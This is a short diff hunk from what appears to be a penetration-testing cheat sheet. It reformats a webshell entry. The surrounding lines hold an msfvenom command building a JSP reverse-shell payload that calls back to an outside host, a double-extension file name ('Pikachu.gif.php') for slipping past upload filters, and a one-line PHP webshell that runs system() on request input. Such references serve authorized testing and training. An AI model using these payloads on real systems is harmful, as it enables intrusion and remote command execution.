@@ -744,7 +744,9 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.25 LPORT=4444 -f war > runme
 
 #### Webshells
 ``` /usr/share/webshells/```
-``` Pikachu.gif.php```
+
+``` Pikachu.gif.php```:
+
 ``` <? php echo system($_REQUEST['cmd']); ?>```
 
 #### Reverse-shell One-liners
